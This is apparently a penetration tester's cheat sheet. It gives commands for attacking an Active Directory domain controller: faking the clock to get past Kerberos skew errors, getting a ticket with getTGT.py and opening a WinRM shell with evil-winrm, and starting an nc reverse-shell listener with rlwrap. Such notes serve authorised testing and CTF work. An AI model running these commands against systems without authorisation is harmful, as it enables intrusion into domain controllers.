## KRB_AP_ERR_SKEW(Clock skew too great)

```bash
faketime "$(rdate -n $DC_IP -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
```

## evil-winrm without NTLM
```bash
# 1 - Get TGT
getTGT.py -dc-ip "DC01.domain.tld" "domain.tld"/"$USER":"$PASSWORD" -k

# 2 - Edit /etc/krb5.conf, example :
[libdefaults]
        default_realm = DOMAIN.TLD
<SNIP>
[realms]
DOMAIN.TLD = {
    kdc = DC01.domain.tld
    kdc = DC01.domain.tld:88
}

# 3 - Get WinRM shell
KRB5CCNAME=TICKET.ccache evil-winrm -i DC01.domain.tld -r domain.tld
```

## revshell using rlwrap
```bash
rlwrap -cAr nc -lvnp 1337
```

## Mount share inside exegol
```bash
--privileged
```